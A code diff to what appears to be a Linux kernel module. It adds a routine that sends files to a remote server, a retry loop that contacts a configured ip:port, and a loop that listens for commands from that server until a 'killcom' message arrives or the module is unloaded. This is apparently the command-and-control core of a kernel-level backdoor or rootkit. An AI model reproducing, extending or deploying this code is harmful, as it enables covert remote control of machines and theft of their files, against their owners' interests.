@@ -380,6 +380,12 @@ int send_file_to_server(char *filename) {
     loff_t file_size, pos = 0;
     int ret_code = 0;
 
+    // Allocate buffer for chunks
+    buffer = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
+    if (!buffer) 
+        return -ENOMEM;
+    memset(buffer, 0, STD_BUFFER_SIZE);
+
     // Open the file
     file = filp_open(filename, O_RDONLY, 0);
     if (IS_ERR(file)) {
@@ -512,7 +518,38 @@ int network_worker(void *data) {
             continue;
         }
 
-        if (!send_initial_message_with_retries()) {
+        // Connection successful
+        break;
+    }
+
+    // Attempt to send the initial message using send_to_server
+    int attempts = 0;
+    do {
+        ret_code = send_to_server(message);
+        if (ret_code != SUCCESS) {
+            ERR_MSG("network_worker: failed to send message, retrying... (attempt %d/%d)\n", attempts + 1, MAX_MSG_SEND_OR_RECEIVE_ERROR);
+            msleep(TIMEOUT_BEFORE_RETRY);
+            attempts++;
+        }
+    } while (ret_code != SUCCESS && attempts < MAX_MSG_SEND_OR_RECEIVE_ERROR);
+
+    // If all attempts to send the message failed, abort
+    if (ret_code < 0) {
+        ERR_MSG("network_worker: failed to send message after %d attempts, giving up.\n", MAX_MSG_SEND_OR_RECEIVE_ERROR);
+        return -FAILURE;
+    }
+
+    DBG_MSG("network_worker: message sent to %s:%d\n", ip, port);
+
+    // Count of empty messages in a row received
+    // This is used to determine if the server is still active
+    // and to avoid flooding the server with empty messages
+    unsigned empty_count = 0;
+    // Listen for commands
+    // Retry until 'killcom' is received or thread is stopped by unmonting the module
+    char *recv_buffer = kmalloc(RCV_CMD_BUFFER_SIZE, GFP_KERNEL);
+    while (!kthread_should_stop() && !thread_exited) {
+        if (receive_from_server(recv_buffer, RCV_CMD_BUFFER_SIZE) == FAILURE) {
             msleep(TIMEOUT_BEFORE_RETRY);
             continue;
         }
